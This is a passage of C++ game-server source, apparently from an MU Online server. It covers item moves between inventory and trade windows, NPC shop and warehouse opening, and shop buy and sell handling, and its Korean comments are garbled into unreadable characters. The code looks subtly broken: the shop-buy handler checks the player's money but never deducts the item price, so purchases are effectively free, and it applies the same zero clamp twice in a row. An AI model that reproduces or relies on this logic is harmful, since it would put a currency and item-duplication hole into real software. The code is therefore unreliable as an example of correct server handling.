				GCMoneySend(lpObj->m_Index, lpObj->Money);
				LogAdd("Pay WareHouse Money(In Inventory) : %d - %d = %d", oldmoney, rZen, lpObj->Money);
			}
#ifdef MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			else if( lpObj->WarehouseMoney-rZen >= 0 )
#else // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			else if( lpObj->WarehouseMoney-rZen > 0 )
#endif // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			{
				int oldmoney=lpObj->WarehouseMoney;
				lpObj->WarehouseMoney -= rZen;
				LogAdd("Pay WareHouse Money(In WareHouse) : %d - %d = %d", oldmoney, rZen, lpObj->WarehouseMoney);
				GCWarehouseInventoryMoneySend(aIndex, 0x01, lpObj->Money, lpObj->WarehouseMoney);
			}
		}
	}
	// Ʈ���̵� �������� �̵��̸�
	else if( lpMsg->sFlag == 1 && lpMsg->tFlag == 1 )
	{
		result = gObjTradeTradeMove(lpObj, source, target);
		GCItemMoveResultSend(aIndex, result, target, ItemInfo);
	}
	// Ʈ���̵忡�� �κ��丮���� �̵��̸�
	else if( lpMsg->sFlag == 1 && lpMsg->tFlag == 0 )
	{
		result = gObjTradeInventoryMove(lpObj, source, target);
		
		if( result == 0xFF )
		{
			GCItemMoveResultSend(aIndex, 0xFF, target, ItemInfo);
			
			CGTradeCancelButtonRecv(aIndex);
		}
		else GCItemMoveResultSend(aIndex, result, target, ItemInfo);
		if( result == 0xFF )
		{
			lpObj->m_IfState.state = 0;
			GCItemListSend(aIndex);
		}
		if( lpObj->TargetNumber >= 0 )
		{
			lpObj->TradeOk = 0;
			gObj[gObj[aIndex].TargetNumber].TradeOk = 0;
			GCTradeOkButtonSend(lpObj->TargetNumber, 0x02);
			GCTradeOkButtonSend(aIndex, 0x00);
		}
	}
	// �κ��丮���� Ʈ���̵���� �̵��̸�
	else if( lpMsg->sFlag == 0 && lpMsg->tFlag == 1 )
	{
		result = gObjInventoryTradeMove(lpObj, source, target);
		GCItemMoveResultSend(aIndex, result, target, ItemInfo);
	}
}


#endif


//----------------------------------------------------------------------------
// [0x25] ��� ��ȭ �Ǿ��ٰ� �ٸ� �÷��̾� ������ �˸���.
//----------------------------------------------------------------------------
void GCEquipmentChange(int aIndex, int pos)
{
	PMSG_USEREQUIPMENTCHANGED	pChange;
	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];

	PHeadSetB((LPBYTE)&pChange, 0x25, sizeof( pChange ));

	pChange.NumberH    = HIBYTE( aIndex );
	pChange.NumberL	   = LOBYTE( aIndex );

	//pChange.ItemInfo[0]  = (BYTE)lpObj->pInventory[pos].m_Type;
	ItemByteConvert(pChange.ItemInfo, lpObj->pInventory[pos]);
	pChange.ItemInfo[1]  = pos<<4;
	pChange.ItemInfo[1] |= LevelSmallConvert(aIndex, pos)&0x0F;
	//BufferItemtoConvert3(pChange.ItemInfo, lpObj->pInventory[pos].m_Type, , BYTE & op1, BYTE & op2, BYTE & op3, BYTE & dur)
	MsgSendV2(lpObj, (LPBYTE)&pChange, pChange.h.size);
}

//----------------------------------------------------------------------------
// [0x30] � ĳ���Ͱ� ���� �ɰڴٰ� ��û�Ѵٸ�..
//----------------------------------------------------------------------------
void CGTalkRequestRecv(LPPMSG_TALKREQUEST lpMsg, int aIndex)
{
	LPOBJECTSTRUCT lpObj = (LPOBJECTSTRUCT)&gObj[aIndex];

	if( PacketCheckTime(lpObj) == FALSE ) return;

	// �������̸� ���� ���ɰ�..
	if( gObj[aIndex].CloseType != -1 )
	{
		return;
	}
	
#ifdef MODIFY_NPCTALK_REQUIREMENT_20051212
	if( gObjIsConnectedGP(aIndex) == FALSE )
	{
		LogAddTD("[ANTI-HACK][NPC Talk] Couldn't talk.. (%s)(%s)", gObj[aIndex].AccountID, gObj[aIndex].Name);
		return;
	}
#endif

	int					DealerNumber;
	PMSG_TALKRESULT		pResult;
	PMSG_SHOPITEMCOUNT	pShopItemCount;
	BYTE				SendByte[1024];
	int					lOfs=0;

	// �ڽ��� ��û�ϰų� �ŷ��� �϶��� 
	if( lpObj->m_IfState.use > 0 )
	{
		return;
	}
	DealerNumber = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
	
	if( (DealerNumber < 0) || (DealerNumber > MAX_OBJECT-1) )
	{
		//MsgBox("����: �ε����� ������ �ʰ�!! %s %d", __FILE__, __LINE__);
		return;
	}

	// ����ڿ� �����ʰ� �ٸ��� ����
	if( lpObj->MapNumber != gObj[DealerNumber].MapNumber ) return;
	
	// ������ �ʹ� �ָ� ������ ������ �ȵȴ�.
#ifdef ADD_KANTURU_20060627		// ĭ���� ������ ����NPC �Ÿ� üũ ���� Ȯ��
	// ĭ���� ������ ����NPC�� ������Ʈ�� ũ�⶧���� �Ÿ� üũ ������ �ø���.
	if( gObj[DealerNumber].Class  == NPC_KANTURU_MACHINE )
	{
		if( ( lpObj->X < gObj[DealerNumber].X - 5 ) || ( lpObj->X > gObj[DealerNumber].X + 5 ) || 
			( lpObj->Y < gObj[DealerNumber].Y - 10 ) || ( lpObj->Y > gObj[DealerNumber].Y + 5 ) )
			return;
	}
	else
#endif	
	if( (lpObj->X < gObj[DealerNumber].X-5) || (lpObj->X > gObj[DealerNumber].X+5) || 
		(lpObj->Y < gObj[DealerNumber].Y-5) || (lpObj->Y > gObj[DealerNumber].Y+5))
	{
		return;
	}
	// �������� üũ�ϰ�
	//
	int ShopNum = gObj[DealerNumber].ShopNumber;

	if( gObj[DealerNumber].Type == OBJTYPE_NPC )
	{
		if( NpcTalk(&gObj[DealerNumber], lpObj) == 1 ) return;
	}

	// ������� �������� ����/â�� ��� ���� �ִ� ���
#ifdef ITEM_DUPLICATE_PREVENT_PATCH_20040719		// ������ ���� ���� - ���� ���, �κ��丮 ���, ī�������� ���� ��
	if (gObjFixInventoryPointer(aIndex) == false) {
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}
#endif

#ifdef GAMESERVER_DIVISION
	if( gObj[DealerNumber].Class == 234 )
	{
		pResult.h.c				= PMHCE_BYTE;
		pResult.h.headcode		= 0x30;
		pResult.h.size			= sizeof( pResult );
		pResult.result			= 0x00;
		pResult.result			= 0x05;		
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif

	if( (gObj[DealerNumber].Type == OBJTYPE_NPC) && (ShopNum < 0) ) 
	{	// ������ �ƴϸ�..
		return;
	}

#ifdef ADD_SHOP_11_12
	if( ShopNum < MAX_SHOP )	// ������ �϶�..	
#else
	if( ShopNum < 11 )	// ������ �϶�..
#endif
	{
		// �����۵� ������ ����
		if( ShopC[ShopNum].ItemCount < 1 ) 
		{
			if( rand()%2 )
				ChatTargetSend(&gObj[DealerNumber], lMsg.Get(1143), aIndex);	// ���� ���� �ʾƿ�~
			else ChatTargetSend(&gObj[DealerNumber], lMsg.Get(1144), aIndex);	// ���� ��簡 �� �ȵǼ���
			return;
		}
		

#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
		if (!gPkLimitFree) {
#endif
		// PK ���..
#ifdef UPDATE_PK_SYSTEM_20070302	// ������ �̿� ����
		BOOL	PKFlag = FALSE;
		if(lpObj->PartyNumber >= 0)	// ��Ƽ�� ���Ұ��
		{
			if( gParty.GetPKPartyPenalty(lpObj->PartyNumber) > PK_LEVEL_DEFAULT+1)
			{
				PKFlag = TRUE;
			}
		}
		else
		{
			if(lpObj->m_PK_Level > PK_LEVEL_DEFAULT+1)
			{
				PKFlag = TRUE;
			}
		}
		
		if(PKFlag == TRUE)
#else
		if( lpObj->m_PK_Level > PK_LEVEL_DEFAULT+1 )
#endif
		{
			if( rand()%2 )
				ChatTargetSend(&gObj[DealerNumber], lMsg.Get(1145), aIndex);	// �ڳ����״� �ƹ��͵� ���� �ʰڳ�..
			else ChatTargetSend(&gObj[DealerNumber], lMsg.Get(1146), aIndex);	// ���̻� �� ������ ���ٳ�.. �ٸ��� ���� �˾ƺ���
			return;
		}
#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
		}
#endif
	}


	if( gMerryXMasNpcEvent == 1)
	{
		if( rand()%6 == 0 )
			ChatTargetSend(&gObj[DealerNumber], lMsg.Get(1147), aIndex);	// �޸� ũ��������!!
	}
	
	if( gHappyNewYearNpcEvent == 1 )
	{
		if( rand()%6 == 0 )
			ChatTargetSend(&gObj[DealerNumber], lMsg.Get(1148), aIndex);	// ���� �� ���� ��������~
	}
		
	lpObj->TargetShopNumber = ShopNum;
	lpObj->m_IfState.use    = 1;
	lpObj->m_IfState.type   = I_SHOP;
	lpObj->m_ShopTime		= 0;

	pResult.h.c				= PMHCE_BYTE;
	pResult.h.headcode		= 0x30;
	pResult.h.size			= sizeof( pResult );
	
#ifdef ADD_GAMBLING_20090120
	if( ShopNum == 18 )		// �׺� ������ ��� 0x22
		pResult.result		= 0x22;
	else					// �Ϲ� ������ 0x00
		pResult.result		= 0x00;
#else // ADD_GAMBLING_20090120
	pResult.result			= 0x00;
#endif // ADD_GAMBLING_20090120
	
#ifdef ADD_IS_ENABLED_GAMBLING_20090504
	if( ShopNum == 18 && g_bGamblingSystem == FALSE )
	{	// �׺� ������ ��� �Ұ������� �����Ǿ� �������
		return;
	}
#endif // ADD_IS_ENABLED_GAMBLING_20090504

#ifdef ADD_SHOP_11_12
	if( ShopNum == 100 )	// â�� ��Ÿ��
#else
	if( ShopNum == 11 )		// â�� ��Ÿ��
#endif
	{
#ifdef WAREHOUSE_ITEMCOPY_BUG_FIX
		if( gObj[aIndex].m_ReqWarehouseOpen )
			return;			// â�� ���� �޶�� ��û�� �̹� �־����� �ٽ� ���� �ʴ´�
		
		gObj[aIndex].m_ReqWarehouseOpen = 1;
#endif
		
		lpObj->m_IfState.type   = I_WAREHOUSE;
		lpObj->m_IfState.state	= 0;
	}
#ifdef ADD_SHOP_11_12
	else if( ShopNum == 101 )	// ī�����ڽ��� ������ȣ 12 -> 101�� �̵�
#else
	else if( ShopNum == 12 )
#endif
	{	// ī���� �ڽ�
		if( bCanChaosBox == TRUE )
		{
#ifdef PERSONAL_SHOP_20040113		// �ڽ��̳� ������ ���λ����� �������̸� ī���� ������ �� �� ����.
			if (lpObj->m_bPShopOpen == true) {
				LogAdd("[%s][%s] is Already Opening PShop, ChaosBox Failed", lpObj->AccountID, lpObj->Name);
				GCServerMsgStringSend(lMsg.Get(1218), lpObj->m_Index, 1);		// "���λ��� ���� �߿����� ī���� ������ ����Ͻ� �� �����ϴ�."
				return;
			}
#endif

			lpObj->m_IfState.type   = I_CHAOSBOX;
			lpObj->m_IfState.state	= 0;

			pResult.result     = 0x03;
#ifdef ADD_EVENT_CHERRYBLOSSOM_20080312
			if (gObj[DealerNumber].Class == NPC_CHERRY)
				pResult.result     = 0x16;
#endif // ADD_EVENT_CHERRYBLOSSOM_20080312

#ifdef UPDATE_LUCKY_COIN_EVENT_20081029
			if (gObj[DealerNumber].Class == NPC_DELGADO)
				pResult.result     = 0x20;
#endif	// UPDATE_LUCKY_COIN_EVENT_20081029
			
#ifdef CHAOS_MIX_TRANSACTION_BUXFIX_20040610
			lpObj->bIsChaosMixCompleted = false;			// ī���� ���� ���� '���� ������ �Ϸ���� �ʾҴ�' �� �ʱⰪ�� ����
#endif

			// �Ǹ��� ���� ���� Ȯ�� �߰�
			pResult.level1	= gDQChaosSuccessRateLevel1;
			pResult.level2	= gDQChaosSuccessRateLevel2;
			pResult.level3	= gDQChaosSuccessRateLevel3;
			pResult.level4	= gDQChaosSuccessRateLevel4;
#ifdef DEVILSQUARE_EXTEND_20050221		// !!! . �ӽ� -> ī���� ���� �߰�
			pResult.level5	= gDQChaosSuccessRateLevel5;
			pResult.level6	= gDQChaosSuccessRateLevel6;
#endif
#ifdef ADD_DEVILSQURE_FOR_MASTER_LEVEL_20071010	// PMSG_TALKRESULT ����7 ���� ����
			pResult.level7	= gDQChaosSuccessRateLevel7;
#endif

			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

			gObjInventoryTrans(lpObj->m_Index);
			LogAddTD("[%s][%s] Open Chaos Box", lpObj->AccountID, lpObj->Name);
			gObjItemTextSave(lpObj);
			gObjWarehouseTextSave(lpObj);

#ifdef MU_CASTLESIEGE_TAX_SYSTEM_20041219		// ���� ����� ���� (ī��������) �� �����ش�.
#ifdef MU_CASTLESIEGE_SERVER_SYNC_20041130
			GCAnsCsMapSvrTaxInfo (lpObj->m_Index, 1, g_CastleSiegeSync.GetTaxRateChaos(lpObj->m_Index));
#endif
#endif
		}
		else 
		{
		}
	}	
	else 
	{
		// ������ �´ٸ�...  ������ȣ�� �����ְ�.. 
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
	}
	
#ifdef ADD_SHOP_11_12
	if( ShopNum == 100 )	// â���϶��� �ڽ��� â�� �������� �����ش�.
#else
	if( ShopNum == 11 )	// â���϶��� �ڽ��� â�� �������� �����ش�.
#endif
	{
		gObj[aIndex].WarehouseCount = 0;		// â�� ��� ����� �ʱ�ȭ �Ѵ�
		GDGetWarehouseList(aIndex, gObj[aIndex].AccountID);
	}
#ifdef ADD_SHOP_11_12
	else if( ShopNum == 101 )
#else
	else if( ShopNum == 12 )
#endif
	{	
	}
	else
	{
		// ������ ������ ����Ʈ�� ������.
		lOfs  = 0;
		lOfs += sizeof( pShopItemCount );
		int size = lOfs+ShopC[ShopNum].SendItemDataLen;
				
		PHeadSetW((LPBYTE)&pShopItemCount, 0x31, size);

		pShopItemCount.Type			= 0;
		pShopItemCount.count		= ShopC[ShopNum].ItemCount;
		memcpy(SendByte, &pShopItemCount, sizeof( pShopItemCount ));
		memcpy(SendByte+lOfs, ShopC[ShopNum].SendItemData, ShopC[ShopNum].SendItemDataLen);

		DataSend(aIndex, (LPBYTE)SendByte, size);

#ifdef MU_CASTLESIEGE_TAX_SYSTEM_20041219		// ���� ����� ���� (����) �� �����ش�.
#ifdef MU_CASTLESIEGE_SERVER_SYNC_20041130
		GCAnsCsMapSvrTaxInfo (lpObj->m_Index, 2, g_CastleSiegeSync.GetTaxRateStore(lpObj->m_Index));
#endif
#endif
	}
}

// [0x31] ������ â�� �������� ������.
void GCUserWarehouseSend(LPOBJECTSTRUCT lpObj)
{
	PMSG_SHOPITEMCOUNT	pMsg;
#ifdef ITEM_INDEX_EXTEND_20050706
	BYTE				SendByte[2048];
#else
	BYTE				SendByte[1024];
#endif	
	
	if( lpObj->m_IfState.type != I_WAREHOUSE )
	{
		return;
	}
		
	// â���µ�.. ������̾��ٸ�..
	if( lpObj->m_IfState.type == I_WAREHOUSE && lpObj->m_IfState.state == 1 )
	{
		return;
	}
	int lOfs = sizeof( pMsg );
		
	PHeadSetW((LPBYTE)&pMsg, 0x31, 0);

	pMsg.count			= 0;
	pMsg.Type			= 0;

	for( int n=0; n<MAX_WAREHOUSEITEMS; n++)
	{
		if( lpObj->pWarehouse[n].IsItem() == TRUE )
		{
			*(SendByte+lOfs) = n;
			lOfs += 1;
			ItemByteConvert( (SendByte+lOfs), lpObj->pWarehouse[n]);

			lOfs += ITEM_BUFFER_SIZE;
			pMsg.count++;
		}
	}
	pMsg.h.sizeH		= HIBYTE(lOfs);
	pMsg.h.sizeL		= LOBYTE(lOfs);
	memcpy(SendByte, &pMsg, sizeof( pMsg ));
	DataSend(lpObj->m_Index, (LPBYTE)SendByte, lOfs);

	GCWarehouseInventoryMoneySend( lpObj->m_Index, 0x01, lpObj->Money, lpObj->WarehouseMoney);
	//LogAdd("%s] %d %d %d", lpObj->Name, lpObj->m_IfState.type, lpObj->m_IfState.state);
	
	if( lpObj->m_IfState.type == I_WAREHOUSE )
	{
		lpObj->m_IfState.state	= 1;
		lpObj->WarehouseSave	= TRUE;
	}
}


//----------------------------------------------------------------------------
// [0x32] �������� ������ ��� ��û 
void CGBuyRequestRecv(LPPMSG_BUYREQUEST lpMsg, int aIndex)
{
	LPOBJECTSTRUCT lpObj = (LPOBJECTSTRUCT)&gObj[aIndex];
	
	PMSG_BUYRESULT pResult;

	PHeadSetB((LPBYTE)&pResult, 0x32, sizeof(pResult));
	pResult.Result = -1;


	if (!PacketCheckTime(lpObj))
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if (gObj[aIndex].CloseType != -1)
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if (!::gObjFixInventoryPointer(aIndex))
	{
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}


	if (gObj[aIndex].m_ShopTime == 0)
		gObj[aIndex].m_ShopTime = 1;

	if (gObj[aIndex].m_ShopTime > 60)
	{
		if (lpObj->m_IfState.use != 0 && lpObj->m_IfState.type == 3)
		{
			lpObj->TargetShopNumber = -1;
			lpObj->m_IfState.use = 0;
			lpObj->m_IfState.type = 0;
		}

		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if (lpObj->m_IfState.use > 0)
	{
		if (lpObj->m_IfState.type != 3)
		{
			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}

	int tShop = lpObj->TargetShopNumber;

	if (tShop < 0 || tShop > MAX_SHOP - 1)
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if (lpMsg->Pos > MAX_SHOPITEM - 1)
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if (ShopC[tShop].m_item[lpMsg->Pos].IsItem() == TRUE)
	{

		if (lpObj->Money < ShopC[tShop].m_item[lpMsg->Pos].m_BuyMoney)
			pResult.Result = -1;
		else
		{
			BOOL bNoItem = TRUE;

			if ((ShopC[tShop].m_item[lpMsg->Pos].m_Type >= MAKE_ITEMNUM(14, 0) && ShopC[tShop].m_item[lpMsg->Pos].m_Type <= MAKE_ITEMNUM(14, 8)) ||
				(ShopC[tShop].m_item[lpMsg->Pos].m_Type >= MAKE_ITEMNUM(14, 35) && ShopC[tShop].m_item[lpMsg->Pos].m_Type <= MAKE_ITEMNUM(14, 40)))
			{
				int dur = ShopC[tShop].m_item[lpMsg->Pos].m_Durability;

				if (dur == 0)
					dur = 1;

				if (::gObjSearchItem(&gObj[aIndex], ShopC[tShop].m_item[lpMsg->Pos].m_Type, dur, ShopC[tShop].m_item[lpMsg->Pos].m_Level) == TRUE)
				{
					bNoItem = FALSE;
					
					if (lpObj->Money < 0)
						lpObj->Money = 0;


					::GCMoneySend(aIndex, lpObj->Money);
				}
			}

			if (bNoItem != FALSE)
			{
				pResult.Result = gObjShopBuyInventoryInsertItem(aIndex, ShopC[tShop].m_item[lpMsg->Pos]);

				if (pResult.Result != 0xFF)
				{
					ItemByteConvert((LPBYTE)&pResult.ItemInfo, ShopC[tShop].m_item[lpMsg->Pos]);
					int lc64 = ShopC[tShop].m_item[lpMsg->Pos].m_BuyMoney;

					if (lpObj->Money < 0)
						lpObj->Money = 0;

					if (lpObj->Money < 0) lpObj->Money = 0;
					GCMoneySend(aIndex, lpObj->Money);

					LogAddTD("[%s][%s] (%d) Shop buy [%d][%d][%d][%s] LEV:%d, DUR:%d, OP:[%d][%d][%d]",
						lpObj->AccountID, lpObj->Name, tShop, lc64, 0, 0, ShopC[tShop].m_item[lpMsg->Pos].GetName(),
						ShopC[tShop].m_item[lpMsg->Pos].m_Level, ShopC[tShop].m_item[lpMsg->Pos].m_Durability,
						ShopC[tShop].m_item[lpMsg->Pos].m_Option1, ShopC[tShop].m_item[lpMsg->Pos].m_Option2,
						ShopC[tShop].m_item[lpMsg->Pos].m_Option3);


				}
			}
		}
				}

	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
}



//----------------------------------------------------------------------------
// [0x33] �������� ������ �ȱ� ��û
void CGSellRequestRecv(LPPMSG_SELLREQUEST lpMsg, int aIndex)
{	

	PMSG_SELLRESULT	pResult;
	LPOBJECTSTRUCT lpObj = (LPOBJECTSTRUCT)&gObj[aIndex];
		
	PHeadSetB((LPBYTE)&pResult, 0x33, sizeof( pResult));

	pResult.Result		= 0;
	pResult.Money		= 0;

	// �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	// �ڽ��� ��û�ϰų� �ŷ��� �϶� �ȱ� �ȵǰ� ����
	if( lpObj->m_IfState.use > 0 )
	{
		if( lpObj->m_IfState.type != I_SHOP )
		{
			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}		
	}
		
	if( PacketCheckTime(lpObj) == FALSE )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_20040719		// ������ ���� ���� - NPC������ �������� �� ��
	if (gObjFixInventoryPointer(aIndex) == false) {
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}
#endif

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_BUGFIX_20040825		// Ʈ������� �ɷ��ִ� ���¿��� NPC������ �������� �� �� ����.
	if (gObj[aIndex].pTransaction == 1) {
		LogAddTD("[%s][%s] CGSellRequestRecv() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].m_IfState.type
			);
		return;
	}
#endif

	int tShop = lpObj->TargetShopNumber;
	if( tShop < 0 || (tShop > MAX_SHOP-1) ) 
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if( gObjCanItemTouch(lpObj, I_SHOP) == FALSE )	// �������� �̵��� �� ���ٸ�
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	// �ڽ��� �κ��丮���� �Ǵ�...
	// � ���������� �Ȼ���� ������ ���߿� üũ�ؾ� �Ѵ�.
	if( lpMsg->Pos > MAX_INVENTORY-1 )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		LogAdd(lMsg.Get(483),lpMsg->Pos);
		return;
	}	

#ifdef ANTIHACKING_SERIAL_0_ITEM_20051202
	if( gObjCheckSerial0ItemList(&lpObj->pInventory[lpMsg->Pos]) )
	{
		// MODIFY_LOCALIZING_WTF_20060309 ���ö���¡ wtf ���� ������Ʈ 0.99.60 - 0.99.94
		MsgOutput( aIndex, lMsg.Get(3354) );			// "����� �� �����ϴ�. �����Ϳ� �����ϼ���."
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		LogAddTD("[ANTI-HACK][Serial 0 Item] [Sell Item] (%s)(%s) Item(%s) Pos(%d)", 
			lpObj->AccountID, lpObj->Name, lpObj->pInventory[lpMsg->Pos].GetName(), lpMsg->Pos);
		return;
	}
#endif
	
	if( lpObj->pInventory[lpMsg->Pos].m_Type == MAKE_ITEMNUM(14,11) ) // ����� ���ڴ� ���ȸ���..
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

#ifndef MODIFY_QUEST_MONSTER_KILL_COUNT_BUGFIX_20070704	// ����Ʈ ������ ������ �� �� �ֵ��� �Ѵ�.
#ifdef NEW_SKILL_FORSKYLAND	
	if( lpObj->pInventory[lpMsg->Pos].m_QuestItem )
	{	// ����Ʈ �������� ���� ���Ѵ�
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif
#endif

#ifdef ADD_NOT_SELL_EQUIPITEM_20080625
	if( IS_EQUIPITEM(lpMsg->Pos) ) 
	{
		pResult.Result = 0xFF; //EERROR::E_NOT_SELL_EQUIPITEM;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif // ADD_NOT_SELL_EQUIPITEM_20080625

#ifdef FOR_BLOODCASTLE3
/*	
	if( lpObj->pInventory[lpMsg->Pos].m_Type == MAKE_ITEMNUM(14,21) &&
		lpObj->pInventory[lpMsg->Pos].m_Level == 2
		) // ������ ���ȸ���.
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
*/
#endif

#ifdef RING_EVENT_ITEMBOX_20031124				// �����̺�Ʈ - �Ǹ� ����
	if( lpObj->pInventory[lpMsg->Pos].m_Type == MAKE_ITEMNUM(13,20) &&
		lpObj->pInventory[lpMsg->Pos].m_Level == 1			// ������ ����
		) // ������ ���� �̺�Ʈ �������� ���ȸ���.
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif

#ifdef FRIENDSHIP_EVENT_RING_BOX_20040211		// ��ģ�� �̺�Ʈ - ������ ������ �� �� ����
	if( lpObj->pInventory[lpMsg->Pos].m_Type == MAKE_ITEMNUM(13,20) &&
		lpObj->pInventory[lpMsg->Pos].m_Level == 2			// ������ ����
		) // ������ ���� �̺�Ʈ �������� ���ȸ���.
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif

#ifdef HIDDEN_TREASUREBOX_EVENT_20050804		// ������ ���� ���� �����۵��� �� �� ����
	if( lpObj->pInventory[lpMsg->Pos].m_Type == MAKE_ITEMNUM(12,26) &&
		(lpObj->pInventory[lpMsg->Pos].m_Level == 1 ||			// ��������
		lpObj->pInventory[lpMsg->Pos].m_Level == 2 ||			// Ǫ������
		lpObj->pInventory[lpMsg->Pos].m_Level == 3 ||			// ��������
		lpObj->pInventory[lpMsg->Pos].m_Level == 4 ||			// ������ ����
		lpObj->pInventory[lpMsg->Pos].m_Level == 5				// ��¦���� (�������� ��ǰ)
		))
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif

#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
	// ��ȭ�� �������� ���� �Ǹ� ����
	if ( g_kJewelOfHarmonySystem.IsStrengthenByJewelOfHarmony( &lpObj->pInventory[lpMsg->Pos] ) == TRUE )
	{
#ifdef ADD_JEWEL_OF_HARMONY_WTFMESSAGE_20060818
		GCServerMsgStringSend(lMsg.Get(3365), lpObj->m_Index, 1); // ��ȭ�� �������� �Ǹ��� �� �����ϴ�.
#endif
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif

#ifdef ADD_PARTIALY_CHARGE_CASH_SHOP_20070117 
	if( IsCashItem( lpObj->pInventory[lpMsg->Pos].m_Type ) == TRUE )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		return;
	}
#endif // ADD_PARTIALY_CHARGE_CASH_SHOP_20070117

#ifdef PREMIUMITEM_20090106
	// �����̾� �������� �Ǹ� �Ұ�
	if(	IsPremiumItem( lpObj->pInventory[lpMsg->Pos].m_Type ) == TRUE )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		return;
	}
#endif // PREMIUMITEM_20090106

#ifndef FOR_KOREA
#ifdef ADD_PREMIUMITEM_PANDA
	if( lpObj->pInventory[lpMsg->Pos].m_Type == MAKE_ITEMNUM( 13, 76)	// �Ҵ����Ź���
	|| lpObj->pInventory[lpMsg->Pos].m_Type == MAKE_ITEMNUM( 13, 80)	// �Ҵ���
	)
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
	
		return;
	}
#endif // ADD_PREMIUMITEM_PANDA
#endif // NOT_FOR_KOREA
	
	if( lpObj->pInventory[lpMsg->Pos].m_Type == MAKE_ITEMNUM(14,12) ) // �̺�Ʈ ������ ��..
	{
		if( lpObj->pInventory[lpMsg->Pos].m_Level == 1 )	// ��Ʈ ������
		{
			pResult.Result = 1;
			pResult.Money  = lpObj->Money;		
			gObjInventoryItemSet(aIndex, lpMsg->Pos, 0xFF);
			lpObj->pInventory[lpMsg->Pos].Clear();
			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

			// # REMOVE_LOVELOVE_EVENT_COUPLING_WITH_JOINSERVER_20060319
			// # ���� ������ �����ؼ� �̺�Ʈ ó���� �� ������ ����(apple)
			//		- �Ʒ� �ּ��� ������ ���� �Ǿ� �־��� �ڵ������ ���� �ľ��� ����.
			//		- ���� ������ ������Ʈ ���� DB �� ����.
			//		- ���� �������� ������Ʈ �ڵ� ���� �� ����.
			//LoveHeartEventSend(aIndex, gObj[aIndex].AccountID, gObj[aIndex].Name );
			return;
		}
	}	

	if( lpObj->pInventory[lpMsg->Pos].IsItem() == FALSE )
	{	// �������� ������ ��������.. �߸��� �ε���		
		pResult.Result = 0;
		pResult.Money  = lpObj->Money;
		LogAdd(lMsg.Get(484), __FILE__, __LINE__, lpObj->Name, lpMsg->Pos);
		LogAdd("ID:%s CharID:%s ", lpObj->AccountID, lpObj->Name);
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
	}
	else // ���� �������� �ִٸ� ������Ű��... ���� �׸�ŭ �谨���Ѿ߰���?? 
	{
		// ���� 20021230		
		BYTE NewOption[8];
		int sellmoney = 0;
		int type = lpObj->pInventory[lpMsg->Pos].m_Type;

#ifdef BUGFIX_SELL_PRICE_OF_DARKLOAD_PETS_20050310 // coder: u4us, date: 2005. 03. 10.	
		if(type == MAKE_ITEMNUM(13,4) || type == MAKE_ITEMNUM(13,5))
			lpObj->pInventory[lpMsg->Pos].PetValue();
		else
#endif // BUGFIX_SELL_PRICE_OF_DARKLOAD_PETS_20050310
			lpObj->pInventory[lpMsg->Pos].Value();
		
		sellmoney = lpObj->pInventory[lpMsg->Pos].m_SellMoney;


		
		/*
		if( type == MAKE_ITEMNUM(4,7) || type == MAKE_ITEMNUM(4,15) )
		{	// ȭ��, ������ �ǸŰ��ݿ� ������ ������ ����
			
		}
		else
		{			
			if( HasItemDurability(type) )
			{	// �������� ������ ������
				CItem* DurItem = &lpObj->pInventory[lpMsg->Pos];
				float ItemDurability = DurItem->m_Durability;

